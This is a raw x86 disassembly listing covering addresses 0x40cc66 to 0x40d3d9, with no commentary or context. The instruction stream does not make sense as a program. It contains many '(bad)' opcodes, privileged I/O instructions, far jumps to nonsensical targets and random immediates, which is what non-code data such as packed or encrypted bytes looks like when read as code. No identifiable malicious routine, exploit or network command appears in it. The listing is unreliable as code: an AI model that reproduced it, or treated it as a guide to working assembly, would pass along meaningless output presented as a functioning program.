  40cc66:	or     BYTE PTR [edi+0x76ff293f],dh
  40cc6c:	sahf   
  40cc6d:	xchg   edi,eax
  40cc6e:	cwde   
  40cc6f:	mov    edi,0x2ff649e
  40cc74:	mov    ecx,0x71b6855b
  40cc79:	cmp    BYTE PTR [edx],0x6f
  40cc7c:	xchg   esi,eax
  40cc7d:	jb     0x40cc20
  40cc7f:	inc    edx
  40cc80:	das    
  40cc81:	sub    BYTE PTR [ebx+0xf],bh
  40cc84:	xor    ebx,DWORD PTR [edi+0x3fd5806d]
  40cc8a:	aam    0x84
  40cc8c:	cmp    eax,0xf2095df
  40cc91:	fucom  st(6)
  40cc93:	ss jmp 0x40e8692d
  40cc99:	push   ebx
  40cc9a:	int3   
  40cc9b:	stc    
  40cc9c:	mov    BYTE PTR [edi-0x79],ah
  40cc9f:	pusha  
  40cca0:	inc    ebx
  40cca1:	xor    eax,0xa2471306
  40cca6:	dec    ebp
  40cca7:	and    ebp,edx
  40cca9:	lahf   
  40ccaa:	out    dx,eax
  40ccab:	ins    BYTE PTR es:[edi],dx
  40ccac:	pop    ebx
  40ccad:	xchg   esi,eax
  40ccae:	sub    eax,0x3ff4971b
  40ccb3:	or     DWORD PTR [edx-0x7f],eax
  40ccb6:	jg     0x40cd1f
  40ccb8:	test   eax,0x3edf6b37
  40ccbd:	jnp    0x40cd09
  40ccbf:	xchg   edi,eax
  40ccc0:	repz pop edx
  40ccc2:	(bad)  [eax-0x24]
  40ccc5:	xchg   ebx,eax
  40ccc6:	mov    esi,DWORD PTR [eax-0x68]
  40ccc9:	sahf   
  40ccca:	(bad)  
  40cccb:	test   DWORD PTR [edi-0x18],edi
  40ccce:	fstp   DWORD PTR [edx+edx*1]
  40ccd1:	inc    ecx
  40ccd2:	sbb    al,0xa
  40ccd4:	dec    edi
  40ccd5:	sar    BYTE PTR [edi],0x49
  40ccd8:	xchg   ebp,eax
  40ccd9:	mov    ds:0xbd8da2fa,eax
  40ccde:	adc    dh,al
  40cce0:	mov    dh,0x8f
  40cce2:	sbb    dl,dl
  40cce4:	mov    eax,0xd4195c68
  40cce9:	mov    edi,0x2382164b
  40ccee:	pusha  
  40ccef:	mov    eax,ds:0x9fd21af2
  40ccf4:	adc    al,0xb6
  40ccf6:	mov    ecx,0xd67518cd
  40ccfb:	ret    
  40ccfc:	xor    BYTE PTR [edx+edi*4+0x24b05a79],ch
  40cd03:	xor    ebp,DWORD PTR [edx+0x1e]
  40cd06:	iret   
  40cd07:	mov    cl,0x96
  40cd09:	fsub   st(1),st
  40cd0b:	clc    
  40cd0c:	sbb    edx,esp
  40cd0e:	adc    al,0x11
  40cd10:	inc    edi
  40cd11:	test   eax,0x7d859866
  40cd16:	stos   DWORD PTR es:[edi],eax
  40cd17:	iret   
  40cd18:	clc    
  40cd19:	std    
  40cd1a:	sahf   
  40cd1b:	cmp    eax,0xeff67516
  40cd20:	pop    edi
  40cd21:	add    BYTE PTR [edx+ebp*2-0x1c3c5f58],ch
  40cd28:	mov    dh,0x3c
  40cd2a:	je     0x40cd12
  40cd2c:	fdivp  st(5),st
  40cd2e:	push   cs
  40cd2f:	cs fstp st(0)
  40cd32:	sbb    ah,BYTE PTR [ebp+0x69]
  40cd35:	jmp    0xf78d9ac6
  40cd3a:	mov    bh,0x99
  40cd3c:	sbb    al,0x44
  40cd3e:	push   ebx
  40cd3f:	stc    
  40cd40:	into   
  40cd41:	inc    ebp
  40cd42:	repz mov esp,0xdf0161ff
  40cd48:	cmp    bl,cl
  40cd4a:	loop   0x40cd12
  40cd4c:	out    0x1f,al
  40cd4e:	add    DWORD PTR [edi+0x33],edi
  40cd51:	ds adc dh,dh
  40cd54:	push   esi
  40cd55:	jecxz  0x40cd80
  40cd57:	int3   
  40cd58:	mov    eax,0x7c4683bb
  40cd5d:	adc    cl,cl
  40cd5f:	dec    ebp
  40cd60:	mov    BYTE PTR [esi],bh
  40cd62:	fnstcw WORD PTR [ebx]
  40cd64:	stos   BYTE PTR es:[edi],al
  40cd65:	sahf   
  40cd66:	sub    DWORD PTR [ebx+ebp*2],0x5a87adc2
  40cd6d:	lock dec ebp
  40cd6f:	jg     0x40ccfd
  40cd71:	daa    
  40cd72:	pop    ebx
  40cd73:	test   al,0x27
  40cd75:	pop    ds
  40cd76:	cmp    BYTE PTR [esi],ah
  40cd78:	outs   dx,DWORD PTR ds:[esi]
  40cd79:	(bad)
  40cd7d:	add    edi,eax
  40cd7f:	loopne 0x40cda1
  40cd81:	xlat   BYTE PTR ds:[ebx]
  40cd82:	clc    
  40cd83:	xchg   esi,eax
  40cd84:	fdivr  st(7),st
  40cd86:	dec    ebp
  40cd87:	hlt    
  40cd88:	mov    al,ds:0xf7f6493
  40cd8d:	call   0x24cf:0x5fbe7aff
  40cd94:	bound  esp,QWORD PTR [esi+0x54ecf30d]
  40cd9a:	adc    ecx,DWORD PTR ds:[edx]
  40cd9d:	sub    al,0x34
  40cd9f:	shr    DWORD PTR [edi-0xc368043],0xc9
  40cda6:	or     BYTE PTR [edx-0x79],cl
  40cda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdaa:	push   ebp
  40cdab:	les    edi,FWORD PTR ds:[ecx+0x33]
  40cdaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdb0:	push   ecx
  40cdb1:	mov    dh,0x24
  40cdb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb4:	mov    DWORD PTR [ebx+0x53],0x6f5672f7
  40cdbb:	pop    edi
  40cdbc:	aad    0xb
  40cdbe:	cdq    
  40cdbf:	rcr    DWORD PTR [edi-0x1de596ec],1
  40cdc5:	jnp    0x40cdce
  40cdc7:	int3   
  40cdc8:	mov    eax,ds:0xfe6b81d8
  40cdcd:	xchg   ebx,eax
  40cdce:	scas   al,BYTE PTR es:[di]
  40cdd0:	pushf  
  40cdd1:	int    0x43
  40cdd3:	pop    edx
  40cdd4:	mov    eax,0x2f62322e
  40cdd9:	or     eax,0x6a8fec77
  40cdde:	daa    
  40cddf:	std    
  40cde0:	sbb    eax,0x6f1e3227
  40cde5:	inc    esi
  40cde6:	nop
  40cde7:	rol    ebx,0x94
  40cdea:	push   0x34b3e76e
  40cdef:	sbb    al,0x3
  40cdf1:	imul   eax,DWORD PTR [edi],0x82bbb49
  40cdf7:	xchg   ecx,eax
  40cdf8:	ja     0x40ce65
  40cdfa:	pop    es
  40cdfb:	popa   
  40cdfc:	popf   
  40cdfd:	and    esi,DWORD PTR [esi+0x4c]
  40ce00:	imul   ebp,DWORD PTR [ecx-0x4b],0x41
  40ce04:	je     0x40cd95
  40ce06:	test   BYTE PTR fs:[ebx-0x23],0xf7
  40ce0b:	fcom   st(6)
  40ce0d:	jae    0x40ce26
  40ce0f:	mov    al,0x2a
  40ce11:	jecxz  0x40ce92
  40ce13:	popa   
  40ce14:	inc    eax
  40ce15:	pop    eax
  40ce16:	push   ecx
  40ce17:	loop   0x40ce35
  40ce19:	mov    dl,0x14
  40ce1b:	out    dx,eax
  40ce1c:	dec    eax
  40ce1d:	bnd jb 0x40cda9
  40ce20:	mov    edx,0x9773bb2c
  40ce25:	sbb    esi,DWORD PTR [edx]
  40ce27:	mov    esi,0x834d96ad
  40ce2c:	sbb    eax,0x4c7d5a80
  40ce31:	aam    0x7e
  40ce33:	push   0xfffffff4
  40ce35:	repnz idiv DWORD PTR [esi+eiz*1]
  40ce39:	jbe    0x40cdd0
  40ce3b:	sar    DWORD PTR ds:0x1e5ca844,0x5d
  40ce42:	aas    
  40ce43:	add    edx,DWORD PTR [esi-0x141ac877]
  40ce49:	xchg   ecx,eax
  40ce4a:	mov    ecx,0xd92bb652
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	xlat   BYTE PTR ds:[ebx]
  40ce63:	shl    BYTE PTR [ebp+0x7e8b2c31],1
  40ce69:	jle    0x40cea3
  40ce6b:	jl     0x40ceeb
  40ce6d:	jle    0x40cea8
  40ce6f:	std    
  40ce70:	push   ecx
  40ce71:	fs leave 
  40ce73:	test   eax,0x108daf26
  40ce78:	push   eax
  40ce79:	fnstcw WORD PTR [ebx]
  40ce7b:	mov    dl,0xec
  40ce7d:	ss pop ss
  40ce7f:	and    ecx,DWORD PTR [edx+0x4]
  40ce82:	arpl   WORD PTR [edi+0x498d8f12],bx
  40ce88:	dec    ebp
  40ce89:	data16 xor BYTE PTR [ebp+0x2138622b],ah
  40ce90:	stos   BYTE PTR es:[edi],al
  40ce91:	cmc    
  40ce92:	cmp    DWORD PTR [eax+edi*8],esi
  40ce95:	sbb    cl,BYTE PTR [esi]
  40ce97:	add    al,BYTE PTR [ebp+ecx*4+0x6700566c]
  40ce9e:	mov    eax,ds:0xcb775214
  40cea3:	aaa    
  40cea4:	jae    0x40cebd
  40cea6:	push   eax
  40cea7:	out    0xfa,eax
  40cea9:	in     eax,0x8a
  40ceab:	pand   mm0,QWORD PTR [edi+edx*8]
  40ceaf:	add    BYTE PTR [edi],ch
  40ceb1:	js     0x40ce6f
  40ceb3:	or     BYTE PTR [esi+eiz*1-0x70],al
  40ceb7:	sar    BYTE PTR [ecx+ecx*2+0x5657788d],0xfc
  40cebf:	lock push esi
  40cec1:	pop    es
  40cec2:	in     eax,dx
  40cec3:	jg     0x40cead
  40cec5:	pop    ebp
  40cec6:	(bad)  
  40cec7:	pusha  
  40cec8:	mov    edx,0x72b7d27c
  40cecd:	test   BYTE PTR [ecx+ebp*2-0x7f],dl
  40ced1:	mov    DWORD PTR [ecx+0x60e89c09],esp
  40ced7:	stc    
  40ced8:	xor    ebx,DWORD PTR [ebx+0x5b23eced]
  40cede:	je     0x40ce73
  40cee0:	lods   eax,DWORD PTR ds:[esi]
  40cee1:	inc    esi
  40cee2:	cs ja  0x40ce8a
  40cee5:	mov    eax,ds:0x7353ce2
  40ceea:	pop    esp
  40ceeb:	fsub   DWORD PTR [eax+0x54]
  40ceee:	sub    ah,BYTE PTR [edx]
  40cef0:	stos   BYTE PTR es:[edi],al
  40cef1:	shl    DWORD PTR [edi],1
  40cef3:	pop    edi
  40cef4:	mov    al,ds:0x905e5103
  40cef9:	xchg   edx,eax
  40cefa:	dec    ebp
  40cefb:	sub    eax,0x7f5ded3c
  40cf00:	mov    esp,DWORD PTR [edx+0x71057b42]
  40cf06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf07:	inc    edx
  40cf08:	cdq    
  40cf09:	adc    BYTE PTR [ebp-0x4dd19e32],ah
  40cf0f:	jmp    0x8a24:0x6b1aef29
  40cf16:	out    0x47,al
  40cf18:	cmp    DWORD PTR [ecx-0x456b2764],ecx
  40cf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf1f:	cmp    cl,BYTE PTR [ebp+0x7a74892b]
  40cf25:	mov    ch,0x1d
  40cf27:	xor    DWORD PTR [esi+0x7505f950],0xffffffa5
  40cf2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf2f:	mov    ebx,0x28fc1ee1
  40cf34:	pop    esi
  40cf35:	sub    eax,0xee0046f7
  40cf3a:	fimul  DWORD PTR [ebx+0x12]
  40cf3d:	mov    al,0x36
  40cf3f:	inc    eax
  40cf40:	xchg   edx,eax
  40cf41:	cmp    ebp,DWORD PTR [eax+0x13]
  40cf44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf45:	sub    edx,DWORD PTR [edx-0x5d424124]
  40cf4b:	xchg   esp,eax
  40cf4c:	leave  
  40cf4d:	fsubr  st(7),st
  40cf4f:	inc    ebx
  40cf50:	and    ch,BYTE PTR [edi-0x1b]
  40cf53:	cdq    
  40cf54:	cmp    BYTE PTR [esp+edi*8],al
  40cf57:	xor    cl,BYTE PTR [ebp-0x38]
  40cf5a:	push   ebp
  40cf5b:	jecxz  0x40cee3
  40cf5d:	aad    0xe3
  40cf5f:	fcmovnb st,st(7)
  40cf61:	repnz (bad) 
  40cf63:	in     al,0x15
  40cf65:	xchg   ebp,eax
  40cf66:	leave  
  40cf67:	cmp    DWORD PTR [edx-0x15],edx
  40cf6a:	cs mov ah,0xcc
  40cf6d:	and    cl,bh
  40cf6f:	pop    esp
  40cf70:	push   edx
  40cf71:	push   0xfffffff8
  40cf73:	xor    al,0x6
  40cf75:	dec    eax
  40cf76:	nop
  40cf77:	fisubr WORD PTR [ecx]
  40cf79:	ja     0x40cf4a
  40cf7b:	jle    0x40cfb5
  40cf7d:	mov    edx,0xeafbc2da
  40cf82:	js     0x40cfd2
  40cf84:	xor    al,0x6
  40cf86:	js     0x40cf4f
  40cf88:	and    dl,al
  40cf8a:	and    BYTE PTR [edx-0x78001b64],0xdd
  40cf91:	lds    esi,FWORD PTR [ecx+ebp*4]
  40cf94:	imul   esi,DWORD PTR [ecx+ebx*8+0x22],0x45
  40cf99:	and    DWORD PTR [ebx],edi
  40cf9b:	arpl   WORD PTR [ebp-0x258f6d41],cx
  40cfa1:	stc    
  40cfa2:	push   ebx
  40cfa3:	into   
  40cfa4:	and    cl,ch
  40cfa6:	mov    DWORD PTR [esi+ebx*4+0x24e58add],0x8d512ba7
  40cfb1:	repz jle 0x40cf40
  40cfb4:	lods   al,BYTE PTR ds:[esi]
  40cfb5:	mov    eax,0x19260284
  40cfba:	pop    ebx
  40cfbb:	pushf  
  40cfbc:	sti    
  40cfbd:	push   es
  40cfbe:	ins    DWORD PTR es:[edi],dx
  40cfbf:	inc    eax
  40cfc0:	aas    
  40cfc1:	int3   
  40cfc2:	idiv   edi
  40cfc4:	sahf   
  40cfc5:	sbb    eax,0xb7acb2f2
  40cfca:	int    0x90
  40cfcc:	scas   eax,DWORD PTR es:[edi]
  40cfcd:	dec    ebp
  40cfce:	mov    ch,0x15
  40cfd0:	sbb    ecx,DWORD PTR [esi+ebx*4+0x6]
  40cfd4:	lock mov DWORD PTR [eax],ebx
  40cfd7:	sub    eax,0x206b6c9a
  40cfdc:	or     ebx,edi
  40cfde:	sbb    dl,BYTE PTR [edx+edx*2+0x68]
  40cfe2:	pop    esi
  40cfe3:	add    al,0x80
  40cfe5:	xchg   edi,eax
  40cfe6:	retf   
  40cfe7:	dec    eax
  40cfe8:	in     eax,dx
  40cfe9:	test   BYTE PTR [ecx-0x7d5b577],dl
  40cfef:	jge    0x40d04e
  40cff1:	sbb    al,0x2a
  40cff3:	aam    0xeb
  40cff5:	jnp    0x40cfc3
  40cff7:	add    eax,0x53750130
  40cffc:	inc    eax
  40cffd:	mov    dh,0x5b
  40cfff:	retf   0x4749
  40d002:	mov    ebx,0xff78919e
  40d007:	shl    DWORD PTR [edi+0x54baf52a],cl
  40d00d:	mov    edi,0xcb843be2
  40d012:	pop    edi
  40d013:	out    0xf,al
  40d015:	test   BYTE PTR [esi-0x7],dl
  40d018:	xor    al,0xb4
  40d01a:	pop    ss
  40d01b:	ss retf 0x1e73
  40d01f:	(bad)  
  40d020:	jg     0x40d09d
  40d022:	adc    DWORD PTR [esi],edi
  40d024:	mov    al,0x9
  40d026:	or     esi,DWORD PTR [edi-0x1a12b9b1]
  40d02c:	or     DWORD PTR ds:[ebx+0x3a20308d],ebx
  40d033:	mov    DWORD PTR [ecx+0x7f],ebp
  40d036:	mov    eax,ds:0xa091c7ae
  40d03b:	sbb    BYTE PTR [ebp+0x90ebc22],0x2c
  40d042:	adc    eax,edx
  40d044:	pop    edi
  40d045:	fs ret 
  40d047:	jnp    0x40d032
  40d049:	inc    ebx
  40d04a:	popa   
  40d04b:	xchg   edi,eax
  40d04c:	imul   eax,DWORD PTR [esi],0x15
  40d04f:	push   ebp
  40d050:	(bad)  
  40d051:	retf   
  40d052:	mov    ah,BYTE PTR ds:[ecx]
  40d055:	clc    
  40d056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d057:	lock sbb eax,DWORD PTR [eax+edi*2]
  40d05b:	rcl    ecx,cl
  40d05d:	sahf   
  40d05e:	cmp    dh,ah
  40d060:	gs addr16 (bad) 
  40d063:	xor    eax,esp
  40d065:	mul    cl
  40d067:	fild   DWORD PTR [ebp+0x30]
  40d06a:	test   eax,0xc5cce2c9
  40d06f:	push   edi
  40d070:	mov    eax,ds:0xe8cce9f
  40d075:	lods   al,BYTE PTR ds:[esi]
  40d076:	into   
  40d077:	outs   dx,BYTE PTR gs:[esi]
  40d079:	adc    dh,dl
  40d07b:	cwde   
  40d07c:	leave  
  40d07d:	ficomp WORD PTR [ecx]
  40d07f:	cli    
  40d080:	jb     0x40d093
  40d082:	xor    ebx,DWORD PTR [ebp+0x26]
  40d085:	and    bh,bl
  40d087:	leave  
  40d088:	pusha  
  40d089:	xchg   edx,esi
  40d08b:	inc    ecx
  40d08c:	mov    eax,ebx
  40d08e:	lock push ecx
  40d090:	in     al,dx
  40d091:	addr16 (bad) 
  40d093:	(bad)  
  40d094:	ss inc edi
  40d096:	cmc    
  40d097:	or     esi,DWORD PTR ds:0x6d6b69bf
  40d09d:	xor    bl,dl
  40d09f:	pop    ss
  40d0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a1:	push   0x99eea5f3
  40d0a6:	loop   0x40d091
  40d0a8:	retf   0x77b7
  40d0ab:	enter  0x4bd1,0xcb
  40d0af:	sahf   
  40d0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0b1:	sub    al,0x30
  40d0b3:	stos   BYTE PTR es:[edi],al
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	xor    BYTE PTR [ebp+0x1c],bh
  40d0d2:	pushf  
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0bd
  40d0dc:	ja     0x40d122
  40d0de:	or     bl,bl
  40d0e0:	mov    edx,ebp
  40d0e2:	mov    ah,0xd8
  40d0e4:	pop    esp
  40d0e5:	sbb    al,cl
  40d0e7:	clc    
  40d0e8:	aad    0x58
  40d0ea:	mov    ds:0xd69a3e4e,al
  40d0ef:	lock inc sp
  40d0f2:	push   ds
  40d0f3:	sub    ah,BYTE PTR [eax+0x1a]
  40d0f6:	pop    ds
  40d0f7:	out    dx,eax
  40d0f8:	mov    al,0x42
  40d0fa:	mov    bh,0x60
  40d0fc:	cmp    cl,ch
  40d0fe:	sbb    eax,0x2db7166c
  40d103:	loop   0x40d089
  40d105:	cli    
  40d106:	sub    bl,BYTE PTR [ecx+ebp*2-0x53]
  40d10a:	(bad)  
  40d10b:	sbb    DWORD PTR [edi-0x1ef50f0d],edx
  40d111:	cli    
  40d112:	scas   al,BYTE PTR es:[edi]
  40d113:	cmp    dh,bl
  40d115:	loope  0x40d0fd
  40d117:	dec    edx
  40d118:	sbb    al,0x43
  40d11a:	inc    edx
  40d11b:	inc    esp
  40d11c:	mov    edx,0xb610539a
  40d121:	into   
  40d122:	enter  0x7fc1,0x39
  40d126:	bound  eax,QWORD PTR [ebp+0x29]
  40d129:	xchg   esp,eax
  40d12a:	daa    
  40d12b:	lods   eax,DWORD PTR ds:[esi]
  40d12c:	inc    ebp
  40d12d:	int3   
  40d12e:	pushf  
  40d12f:	adc    edx,DWORD PTR [edx+ebp*2+0x6ab146e]
  40d136:	leave  
  40d137:	pop    es
  40d138:	push   edx
  40d139:	loop   0x40d10d
  40d13b:	vpcmpeqd xmm1,xmm3,XMMWORD PTR [ecx-0x6f9af99d]
  40d143:	enter  0xd668,0x71
  40d147:	stos   DWORD PTR es:[edi],eax
  40d148:	mov    edx,0x2460f141
  40d14d:	push   ecx
  40d14e:	(bad)  
  40d14f:	ins    DWORD PTR es:[edi],dx
  40d150:	in     al,dx
  40d151:	inc    ebp
  40d152:	test   DWORD PTR [esi-0x35],edi
  40d155:	sbb    al,0x51
  40d157:	sbb    esp,edi
  40d159:	popf   
  40d15a:	pusha  
  40d15b:	jl     0x40d16b
  40d15d:	ss adc ecx,ebp
  40d160:	cmp    BYTE PTR [ebp-0xb7e42ad],0xc0
  40d167:	adc    eax,0xd2b6b87b
  40d16c:	lods   al,BYTE PTR ds:[esi]
  40d16d:	jne    0x40d11b
  40d16f:	push   esi
  40d170:	xchg   ebp,eax
  40d171:	sbb    edx,esp
  40d173:	and    eax,DWORD PTR [ebp-0x53]
  40d176:	fidivr WORD PTR [ebx-0x37256552]
  40d17c:	cmp    eax,0x67c579c5
  40d181:	mov    ebp,0x5625727
  40d186:	push   esp
  40d187:	push   0x55
  40d189:	jecxz  0x40d201
  40d18b:	jle    0x40d188
  40d18d:	cmp    DWORD PTR [ebp-0x56],esp
  40d190:	pop    esp
  40d191:	add    al,0x16
  40d193:	cld    
  40d194:	sub    al,0x2c
  40d196:	mov    bl,0x44
  40d198:	xchg   al,bh
  40d19a:	outs   dx,BYTE PTR ds:[esi]
  40d19b:	mov    ebx,fs
  40d19d:	jle    0x40d12f
  40d19f:	dec    esp
  40d1a0:	xchg   DWORD PTR [ebx-0xa],esi
  40d1a3:	pop    esi
  40d1a4:	fild   DWORD PTR [ebx+0x49]
  40d1a7:	test   eax,0x2ea6c1dd
  40d1ac:	adc    bl,BYTE PTR [edx]
  40d1ae:	push   es
  40d1af:	adc    bl,BYTE PTR [edi-0x2895cd3c]
  40d1b5:	fmul   DWORD PTR ds:0x9f1ebfcf
  40d1bb:	in     eax,dx
  40d1bc:	or     eax,0x121f6985
  40d1c1:	es jle 0x40d193
  40d1c4:	ret    
  40d1c5:	test   eax,0xe541a258
  40d1ca:	(bad)  
  40d1cb:	mov    bh,0x6a
  40d1cd:	sub    al,BYTE PTR [edi+0x1c]
  40d1d0:	mov    ecx,0xd7d0c24c
  40d1d5:	and    eax,ebx
  40d1d7:	and    edi,0xb7a17d5a
  40d1dd:	mov    esp,0x77feabae
  40d1e2:	daa    
  40d1e3:	jl     0x40d23f
  40d1e5:	push   ss
  40d1e6:	pop    ebp
  40d1e7:	xchg   esi,eax
  40d1e8:	jae    0x40d252
  40d1ea:	inc    DWORD PTR [edi-0x6d89de37]
  40d1f0:	pop    edx
  40d1f1:	sbb    DWORD PTR [edx-0x5e],eax
  40d1f4:	xchg   BYTE PTR [esi],ch
  40d1f6:	rcl    DWORD PTR [ebx+0x24],1
  40d1f9:	push   esi
  40d1fa:	pop    es
  40d1fb:	sbb    DWORD PTR [edi+ebx*2+0x136640d3],esp
  40d202:	sbb    DWORD PTR [edi-0x81288a3],ebx
  40d208:	adc    eax,0x34da5678
  40d20d:	nop
  40d20e:	dec    edi
  40d20f:	mov    cs,WORD PTR [ebx+0x1c]
  40d212:	outs   dx,DWORD PTR ds:[esi]
  40d213:	mov    ah,BYTE PTR [ebp-0x7b4571b0]
  40d219:	repz dec edi
  40d21b:	fisttp QWORD PTR [esi+esi*1-0x57f59dcb]
  40d222:	hlt    
  40d223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d224:	or     cl,BYTE PTR [eax]
  40d226:	lahf   
  40d227:	fdivr  st(3),st
  40d229:	leave  
  40d22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d22b:	jb     0x40d1b1
  40d22d:	add    eax,0xa4c2f555
  40d232:	pop    esi
  40d233:	pop    esi
  40d234:	pushf  
  40d235:	addr16 sti 
  40d237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d238:	lds    esi,FWORD PTR [esi+0x52]
  40d23b:	sub    eax,0x6a75c97a
  40d240:	test   al,0x48
  40d242:	add    dh,cl
  40d244:	mov    ds,ebp
  40d246:	xchg   esi,eax
  40d247:	mov    al,ds:0x65e4a4fd
  40d24c:	popa   
  40d24d:	popa   
  40d24e:	jno    0x40d259
  40d250:	cmp    DWORD PTR [ebx+0x2b],0x422904f0
  40d257:	push   esp
  40d258:	cli    
  40d259:	sub    eax,0x77c6a004
  40d25e:	and    DWORD PTR [esi-0x10e38e5a],edx
  40d264:	int3   
  40d265:	stos   BYTE PTR es:[edi],al
  40d266:	pop    ecx
  40d267:	(bad)  
  40d268:	mov    esi,0xd498647f
  40d26d:	test   DWORD PTR [ebp+edx*8+0x3e],0xd3d0b1ee
  40d275:	mov    esi,0xb3a118b5
  40d27a:	data16 cmp BYTE PTR [edi-0x2802b330],cl
  40d281:	call   0x30dd5458
  40d286:	jge    0x40d289
  40d288:	aaa    
  40d289:	arpl   WORD PTR [edx],sp
  40d28b:	shl    DWORD PTR [edx-0x2],0xf3
  40d28f:	cwde   
  40d290:	dec    edx
  40d291:	pusha  
  40d292:	push   esp
  40d293:	pop    edx
  40d294:	mov    ebp,0x823e7081
  40d299:	mov    ecx,esi
  40d29b:	imul   ebp,DWORD PTR [esi],0x966d3d28
  40d2a1:	aad    0x22
  40d2a3:	es jge 0x40d266
  40d2a6:	call   0xd43f:0x7f60a210
  40d2ad:	push   ss
  40d2ae:	xor    ecx,DWORD PTR cs:[ebx-0x5f6db4ed]
  40d2b5:	jnp    0x40d2c6
  40d2b7:	jp     0x40d251
  40d2b9:	cld    
  40d2ba:	push   eax
  40d2bb:	xlat   BYTE PTR ds:[ebx]
  40d2bc:	cdq    
  40d2bd:	xchg   edi,eax
  40d2be:	xlat   BYTE PTR ds:[ebx]
  40d2bf:	push   es
  40d2c0:	mov    BYTE PTR [ebp+0x1d1913c8],bh
  40d2c6:	xchg   DWORD PTR [edx+ebp*8-0x73470f19],esi
  40d2cd:	pushf  
  40d2ce:	nop
  40d2cf:	push   cs
  40d2d0:	xor    edx,0x37d2cc4c
  40d2d6:	jmp    0x36f6:0xc73b6891
  40d2dd:	div    DWORD PTR [ecx]
  40d2df:	cmc    
  40d2e0:	cmp    ch,BYTE PTR [ebx]
  40d2e2:	xor    esi,edi
  40d2e4:	pop    esp
  40d2e5:	adc    BYTE PTR [edi+eax*2],bl
  40d2e8:	jne    0x40d28d
  40d2ea:	in     al,0x3d
  40d2ec:	(bad)  
  40d2ed:	call   0x13bbafab
  40d2f2:	dec    edx
  40d2f3:	mov    eax,0xe53c026f
  40d2f8:	pop    esp
  40d2f9:	loop   0x40d370
  40d2fb:	into   
  40d2fc:	bound  esi,QWORD PTR [ebx+0x51c701ac]
  40d302:	jg     0x40d2d0
  40d304:	aaa    
  40d305:	data16 mov WORD PTR es:[eax-0x3d02a6ac],ds
  40d30d:	data16 or al,0xa2
  40d310:	jp     0x40d322
  40d312:	or     DWORD PTR [eax+0x71],0x4c
  40d316:	les    eax,FWORD PTR [edx]
  40d318:	inc    edi
  40d319:	fdiv   DWORD PTR [edi+ecx*1]
  40d31c:	cs mov al,0x18
  40d31f:	or     al,0xd9
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	das    
  40d339:	lods   al,BYTE PTR ds:[esi]
  40d33a:	in     al,dx
  40d33b:	adc    BYTE PTR [eax+0x387e7e97],dh
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d39f
  40d345:	xor    esi,DWORD PTR [ecx+0x3025e7dd]
  40d34b:	popf   
  40d34c:	sub    BYTE PTR fs:[ecx+0x670f3421],0xfe
  40d354:	ret    0x417f
  40d357:	stos   DWORD PTR es:[edi],eax
  40d358:	push   esp
  40d359:	js     0x40d367
  40d35b:	rcl    BYTE PTR [eax+0x76],cl
  40d35e:	pop    esi
  40d35f:	(bad)  
  40d360:	cmp    al,0x4e
  40d362:	ret    
  40d363:	fldl2t 
  40d365:	or     edi,esp
  40d367:	imul   edi,DWORD PTR [esp+eiz*2+0x620dfa9],0x12e31bf7
  40d372:	inc    ebx
  40d373:	cdq    
  40d374:	pop    ecx
  40d375:	call   0xa7e3:0x546b87c5
  40d37c:	out    0xd0,eax
  40d37e:	in     al,dx
  40d37f:	and    al,0x96
  40d381:	inc    edx
  40d382:	test   eax,0xc51c7051
  40d387:	add    al,0xfe
  40d389:	cs or  edi,edi
  40d38c:	jle    0x40d322
  40d38e:	std    
  40d38f:	repz sub DWORD PTR [edi-0x31d024b8],esp
  40d396:	jne    0x40d379
  40d398:	cwde   
  40d399:	ss fucomi st,st(1)
  40d39c:	sub    al,0x9f
  40d39e:	xchg   ebp,eax
  40d39f:	rol    BYTE PTR [ebx-0x76712368],cl
  40d3a5:	test   BYTE PTR [esi+0x420a6831],0xea
  40d3ac:	stos   DWORD PTR es:[edi],eax
  40d3ad:	mov    al,0x1d
  40d3af:	popa   
  40d3b0:	(bad)  [ebp-0x7e8e5195]
  40d3b6:	(bad)  
  40d3b7:	cmp    esi,DWORD PTR [ebx]
  40d3b9:	mov    ebx,0xc4eea9f0
  40d3be:	mov    bl,0xa2
  40d3c0:	std    
  40d3c1:	std    
  40d3c2:	and    ebx,esp
  40d3c4:	lea    ecx,ds:0x6c02dc77
  40d3ca:	(bad)  
  40d3cb:	adc    DWORD PTR [edx+0x7a],0x48
  40d3cf:	scas   eax,DWORD PTR es:[edi]
  40d3d0:	mov    eax,ebx
  40d3d2:	adc    DWORD PTR ds:0xaed13670,0x6a
  40d3d9:	inc    ecx
